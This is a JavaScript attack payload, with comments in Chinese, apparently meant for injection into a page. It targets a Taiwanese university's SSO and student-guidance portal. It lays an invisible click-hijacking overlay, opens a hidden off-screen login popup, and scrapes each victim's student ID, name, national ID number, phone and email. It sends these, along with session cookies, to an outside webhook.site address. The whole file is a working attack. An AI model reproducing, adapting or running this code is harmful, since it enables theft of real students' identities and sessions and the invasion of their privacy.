(async () => {
    // === 設定 (請確認 URL 正確) ===
    const webhook = "https://webhook.site/27f621f1-be96-441d-b9d6-41fa8f6f788e";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";

    // === 工具函數 ===
    
    // 1. CORS 繞過日誌記錄器 (射後不理)
    const log = (msg) => {
        try {
            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
        } catch(e) {}
    };

    // 2. 數據外傳器 (no-cors)
    const exfiltrate = (data) => {
        try {
            const payload = JSON.stringify(data);
            if (navigator.sendBeacon) {
                const blob = new Blob([payload], {type: 'text/plain'});
                navigator.sendBeacon(webhook, blob);
            } else {
                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'text/plain'},
                    body: payload
                });
            }
            log("Exfiltration_Sent");
        } catch (e) {
            log("Exfil_Error_" + e.message);
        }
    };

    // === 攻擊流程 ===

    async function executeAttack() {
        log("Script_Started_v2");

        // 步驟 1: 建立全屏隱形覆蓋層 (點擊劫持)
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,0); 
            z-index: 2147483647;
            cursor: default;
        `;
        overlay.id = 'security_check_overlay';
        document.body.appendChild(overlay);
        
        log("Overlay_Ready");

        // 步驟 2: 定義觸發器
        const clickHandler = async (event) => {
            overlay.remove(); // 移除覆蓋層
            log("Click_Captured");

            // 步驟 3: 觸發 SSO 彈窗
            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-2000,top=-2000");
            
            if (popup) {
                try { popup.blur(); window.focus(); } catch(e) {}
                
                // 等待 6 秒 (比之前多一點點，保險起見)
                await new Promise(r => setTimeout(r, 6000));
                
                try { popup.close(); } catch(e) {}
                log("Popup_Phase_Done");

                // 步驟 4: 獲取數據
                try {
                    const response = await fetch(targetUrl);
                    const text = await response.text();

                    // 步驟 5: 解析數據 (使用您的正則邏輯)
                    let info = {};
                    try {
                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                    } catch (parseErr) {
                        log("Parse_Error");
                    }

                    // 步驟 6: 回傳
                    exfiltrate({
                        status: "SUCCESS",
                        data: info,
                        cookie: document.cookie,
                        // 包含 HTML 片段以供除錯 (如果數據仍為 N/A)
                        partial_source: text.substring(0, 2000) 
                    });

                } catch (fetchErr) {
                    log("Fetch_Error_" + fetchErr.message);
                }

            } else {
                log("Popup_Blocked");
            }
        };

        // 綁定監聽器
        overlay.addEventListener('click', clickHandler, { once: true });
    }

    // 執行
    try {
        executeAttack();
    } catch(e) {
        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
    }
})();